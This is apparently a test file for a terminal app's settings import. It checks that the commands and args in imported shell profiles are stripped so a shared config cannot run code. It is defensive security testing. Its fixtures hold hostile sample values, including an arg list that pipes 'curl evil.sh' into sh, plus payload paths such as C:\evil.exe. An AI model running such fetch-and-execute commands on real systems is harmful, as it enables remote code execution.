import {afterEach, describe, expect, it} from 'bun:test'
import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'

/**
 * Import is the one settings path that takes its input from a file the user
 * picked off disk, so a profile's `command`/`args` — which are spawned verbatim
 * on every new tab — are executable content arriving from outside the app.
 *
 * The realistic vector is a *chosen file*, not a chosen victim: a config
 * posted in a gist, issue or "share your theme" tool. The user imports what
 * they believe is a colour scheme and gets code execution on every tab opened
 * afterwards, with no prompt and nothing in the UI to notice.
 *
 * These tests pin the mitigation: the profile travels, its command does not.
 */

let counter = 0
const scratchDirs: string[] = []
let activeStore: typeof import('../../electron/settingsStore.ts') | null = null

/**
 * Fresh module copy per test, so `rejectedBySource` (module-level state) and
 * the profile defaults cannot leak between cases.
 */
async function storeWithScratchHome(): Promise<
	typeof import('../../electron/settingsStore.ts')
> {
	const home = fs.mkdtempSync(path.join(os.tmpdir(), 'ivx-import-'))
	scratchDirs.push(home)
	// Distinct specifier so Bun evaluates a fresh copy of the module; that also
	// means the override below cannot leak into another test file.
	const store = await import(`../../electron/settingsStore.ts?i=${counter++}`)
	// Redirect through the seam, not $HOME / $USERPROFILE: Bun resolves
	// `os.homedir()` once at process start, so an environment override does not
	// move the settings dir and these tests would write to the real
	// ~/.involvex-term.
	store.setSettingsHome(home)
	activeStore = store
	return store
}

afterEach(() => {
	activeStore?.setSettingsHome(null)
	activeStore = null
	while (scratchDirs.length) {
		fs.rmSync(scratchDirs.pop()!, {recursive: true, force: true})
	}
})

describe('app-generated profiles are trusted, not stripped', () => {
	// On Linux the app's own default profile IS a `custom` one pointing at
	// $SHELL, so a naive strip reported a safety removal on every import for a
	// shell the app itself chose. That is the permanent-warning failure mode:
	// once the banner is always there, the one that matters gets ignored too.
	//
	// `stripProfileCommands` takes the generated set as an argument precisely
	// so this is testable on Windows, where no builtin carries a command.

	const GENERATED = [
		{
			id: 'default',
			name: 'bash',
			kind: 'custom' as const,
			command: '/bin/bash',
			args: ['--login'],
		},
	]

	function settingsWith(
		profiles: unknown[],
	): Parameters<
		typeof import('../../electron/settingsStore.ts').stripProfileCommands
	>[0] {
		return {terminal: {profiles}} as never
	}

	it('keeps a profile identical to a generated one', async () => {
		const store = await storeWithScratchHome()
		const settings = settingsWith([
			{
				id: 'default',
				name: 'bash',
				kind: 'custom',
				command: '/bin/bash',
				args: ['--login'],
			},
		])

		const dropped = store.stripProfileCommands(settings, GENERATED)

		expect(dropped).toEqual([])
		expect(
			(settings.terminal.profiles as Array<Record<string, unknown>>)[0].command,
		).toBe('/bin/bash')
	})

	it('strips when only the command differs', async () => {
		const store = await storeWithScratchHome()
		const settings = settingsWith([
			{
				id: 'default',
				name: 'bash',
				kind: 'custom',
				command: '/tmp/evil',
				args: ['--login'],
			},
		])

		expect(store.stripProfileCommands(settings, GENERATED)).toEqual([
			'terminal.profiles[0].command',
		])
	})

	it('strips when only the args differ', async () => {
		// The args are what make a shell do something; a trusted command with
		// untrusted flags is still arbitrary execution.
		const store = await storeWithScratchHome()
		const settings = settingsWith([
			{
				id: 'default',
				name: 'bash',
				kind: 'custom',
				command: '/bin/bash',
				args: ['--login', '-c', 'curl evil.sh | sh'],
			},
		])

		expect(store.stripProfileCommands(settings, GENERATED)).toHaveLength(1)
	})

	it('strips when the id is borrowed from a generated profile', async () => {
		// Otherwise an import could reuse the trusted id to smuggle a path.
		const store = await storeWithScratchHome()
		const settings = settingsWith([
			{
				id: 'default',
				name: 'bash',
				kind: 'custom',
				command: '/tmp/evil',
				args: ['--login'],
			},
		])

		expect(store.stripProfileCommands(settings, GENERATED)).toHaveLength(1)
	})

	it('strips when the kind is borrowed from a generated profile', async () => {
		const store = await storeWithScratchHome()
		const settings = settingsWith([
			{
				id: 'default',
				name: 'bash',
				kind: 'cmd',
				command: '/bin/bash',
				args: ['--login'],
			},
		])

		expect(store.stripProfileCommands(settings, GENERATED)).toHaveLength(1)
	})
})

describe('parseImportedSettings: profile commands are not imported', () => {
	it('drops a custom profile command that would be spawned', async () => {
		const store = await storeWithScratchHome()

		const imported = store.parseImportedSettings({
			terminal: {
				profiles: [
					{
						id: 'payload',
						name: 'Totally Normal',
						kind: 'custom',
						command: 'C:\\Users\\victim\\Downloads\\setup.exe',
						args: ['--silent'],
					},
				],
			},
		})

		const profile = imported.terminal.profiles[0]
		expect(profile.command).toBeUndefined()
		expect(profile.args).toBeUndefined()
		// Identity survives, so the reference graph still resolves.
		expect(profile.id).toBe('payload')
		expect(profile.kind).toBe('custom')
	})

	it('drops a command smuggled onto a builtin kind', async () => {
		// The case a `kind === 'custom'` filter would miss: resolveProfile
		// honours `command` for every builtin kind whenever the path exists
		// (shellProfiles.ts), so `kind: 'cmd'` runs an arbitrary binary too.
		const store = await storeWithScratchHome()

		const imported = store.parseImportedSettings({
			terminal: {
				profiles: [
					{
						id: 'cmd',
						name: 'Command Prompt',
						kind: 'cmd',
						command: 'C:\\Windows\\System32\\calc.exe',
					},
				],
			},
		})

		expect(imported.terminal.profiles[0].command).toBeUndefined()
	})

	it('drops args even when the command is empty', async () => {
		// args are appended to the resolved shell, so `-File payload.ps1`
		// executes on a profile that still looks harmless.
		const store = await storeWithScratchHome()

		const imported = store.parseImportedSettings({
			terminal: {
				profiles: [
					{
						id: 'pwsh',
						name: 'PowerShell 7',
						kind: 'pwsh',
						command: '',
						args: ['-File', 'C:\\Users\\victim\\payload.ps1'],
					},
				],
			},
		})

		const profile = imported.terminal.profiles[0]
		expect(profile.args).toBeUndefined()
		expect(profile.command).toBeUndefined()
	})

	it('keeps the profile reference pointing at a real profile', async () => {
		// Dropping the whole entry instead of just its command would leave
		// defaultProfileId pointing at nothing.
		const store = await storeWithScratchHome()

		const imported = store.parseImportedSettings({
			terminal: {
				defaultProfileId: 'payload',
				profiles: [
					{
						id: 'payload',
						name: 'Custom',
						kind: 'custom',
						command: 'C:\\evil.exe',
					},
				],
			},
		})

		expect(imported.terminal.defaultProfileId).toBe('payload')
		expect(
			imported.terminal.profiles.some(
				p => p.id === imported.terminal.defaultProfileId,
			),
		).toBe(true)
	})

	it('reports the stripped paths so the import is not silent', async () => {
		const store = await storeWithScratchHome()

		store.parseImportedSettings({
			terminal: {
				profiles: [
					{
						id: 'payload',
						name: 'Custom',
						kind: 'custom',
						command: 'C:\\evil.exe',
					},
				],
			},
		})

		expect(store.rejectedSettingsPaths('import')).toEqual([
			'terminal.profiles[0].command',
		])
	})

	it('leaves the rest of the import intact', async () => {
		// Stripping must not cost the user the settings they actually wanted.
		const store = await storeWithScratchHome()

		const imported = store.parseImportedSettings({
			theme: {bg: '#002b36', fontSize: 15},
			terminal: {
				startDir: 'D:\\repos',
				scrollback: 9000,
				profiles: [
					{
						id: 'payload',
						name: 'Custom',
						kind: 'custom',
						command: 'C:\\evil.exe',
					},
				],
			},
		})

		expect(imported.theme.bg).toBe('#002b36')
		expect(imported.theme.fontSize).toBe(15)
		expect(imported.terminal.startDir).toBe('D:\\repos')
		expect(imported.terminal.scrollback).toBe(9000)
	})

	it('reports nothing for a profile that never had a command', async () => {
		// Builtins carry no command, so the ordinary case must stay silent —
		// a permanent warning would train the user to ignore it.
		const store = await storeWithScratchHome()

		store.parseImportedSettings({
			terminal: {profiles: [{id: 'cmd', name: 'Command Prompt', kind: 'cmd'}]},
		})

		expect(store.rejectedSettingsPaths('import')).toEqual([])
	})
})
